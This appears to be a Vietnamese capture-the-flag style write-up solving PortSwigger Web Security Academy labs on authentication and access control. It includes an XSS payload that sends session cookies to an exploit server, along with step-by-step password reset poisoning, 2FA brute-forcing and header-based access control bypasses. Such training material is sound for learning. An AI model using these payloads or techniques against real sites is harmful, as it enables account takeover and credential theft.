# WriteUp_PortSwigger

# Authentication

<h2>Lab: Offline password cracking</h2>
Đăng nhập vào lab bằng tài khoản cho trước: wiener:peter. Sau đó vào một post bất kì, comment vào bằng payload XSS <code><script>document.location='//exploit-ac071f2a1ef03225c0a90ac401b80031.web-security-academy.web-security-academy.net/'+document.cookie</script></code>
Sau đó truy cập vào server exploit do lab cung cấp sẵn, rồi vào accesslog, ta sẽ thấy:

![image](https://user-images.githubusercontent.com/44827139/158007468-4ff7a879-994f-44ce-beaf-6eeec9791335.png)

Focus vào request có chứa cookie <code>stay-loged-in</code>, ta lấy giá trị rồi decode base 64 thu được: <code>carlos:26323c16d5f4dabff3bb136f2460a943</code>
Sau đó tìm đoạn mã md5 (26323c16d5f4dabff3bb136f2460a943) trên google sẽ ra giá trị trc khi encode của nó là <code>onceuponatime</code>, đây chính là mật khẩu.

![image](https://user-images.githubusercontent.com/44827139/158007617-37e34eee-21b6-4f01-ba31-5ba930de4390.png)

Đăng nhập dùng username và password đã tìm được rồi xóa user là giải được lab.

<h2>Lab: Password reset poisoning via middleware</h2>

Thực hiện việc reset password của user lab đã cho trong khi bật proxy burp suite, sau đó gửi request POST /forgot-password vào Repeater, thêm header <code>X-Forwarded-Host:exploit-acf01f131e7674fdc0621ab501c300af.web-security-academy.net</code> và sửa giá trị của username thành carlos.
![image](https://user-images.githubusercontent.com/44827139/158009440-62bd4000-c6ef-41d1-bb40-4251dd8c1dda.png)
Sau đó truy cập server exploit cho sẵn của lab -> access log -> tìm đến request có chứa token <code>temp-forgot-password-token</code>.
Vào email client dc cho sẵn ->cop đường dẫn reset password, sau đó thay giá trị của token vừa copy được vào -> đổi mật khẩu taaif khoản của username carlos -> done.

<h2>Lab: 2FA bypass using a brute-force attack</h2>
Đăng nhập bằng tài khoản carlos, đến phần xác thực lớp thứ 2 thì nếu nhập sai code, ta sẽ bị log out, vậy nên cần phải tạo một macro trong burp suite

![image](https://user-images.githubusercontent.com/44827139/158010542-eac469a9-c268-458e-afee-e6eab261f26b.png)

Trong burp suite, chọn Project options > Sessions.Trong Session Handling Rules panel, bấm Add, hộp thoại Session handling rule editor hiện ra.  

![image](https://user-images.githubusercontent.com/44827139/158010624-d50d158f-d79c-4602-842f-cca260be867e.png)

Vào tab Scope, trong URL Scope, chọn option Include all URLs.
![image](https://user-images.githubusercontent.com/44827139/158010652-06f95af7-bb07-4e8d-9b68-23a007051746.png)

Quay lại tab Details, trong Rule Actions, chọn Add > Run a macro.
![image](https://user-images.githubusercontent.com/44827139/158010685-b3d8d071-a481-47dd-ab12-3d3d177eba04.png)

Dưới Select macro nhấn Add để mở Macro Recorder
![image](https://user-images.githubusercontent.com/44827139/158010712-2dfa67bf-f318-49c0-9034-e91630bc7132.png)

Sau đó chọn 3 requets 
<code>
GET /login <br>
POST /login <br>
GET /login2 <br>
</code>

Quay lại màn hình chính burp suite, gửi request <code>POST /login2</code> đến Intruder -> đặt một biến vào <code>mfa-code:</code>
![image](https://user-images.githubusercontent.com/44827139/158010833-dea3b258-9093-48b1-ab24-597f22c8f3bf.png)

Setup payload như hình
![image](https://user-images.githubusercontent.com/44827139/158010878-c5c38048-51f6-49a8-a4d9-3a48b781aa32.png)

Trong Resource pools: 
![image](https://user-images.githubusercontent.com/44827139/158010900-bd9028f1-c0ae-4a1e-9cdb-8d859a7f5f6f.png)

Bắt đầu attacks, khi thấy 1 request nào đó trả về 302 code thì request đó thành công. Chọn request đó -> chuột phải -> show requets in browser-> copy link lên browser -> done

# Access Control

<h2>Lab: URL-based access control can be circumvented</h2>
Truy cập vào Admin Panel, ta sẽ thấy kết quả trả về là "Access Denied". Gửi request tới Burp Suite Repeater. Thêm URL trong phần request thành <code>/?username=carlos</code> và thêm header <code>X-Original-URL: /admin/delete</code> -> send requets -> xóa được user Carlos

![image](https://user-images.githubusercontent.com/44827139/158012393-7201ce3e-7fb8-4391-ae2a-8b173e37b233.png)

<h2>Lab: Method-based access control can be circumvented</h2>

Đăng nhập vào web bằng tài khoản admin cho sẵn -> admin panel -> nâng role của carlos thành admin -> gửi requets này đến Burp Repeater. Mở browser của burp suite lên sau đó đăng nhập bằng tài khoản người dùng thông thường (wiener) sau đó copy session cookie của tài khoản này, dán vào cookie của request trong repeater, đổi method thành get, sửa tham số thành wiener sau đó send -> done.
![image](https://user-images.githubusercontent.com/44827139/158012700-572d6c8b-ef18-4e6c-bf32-504e6eca37aa.png)

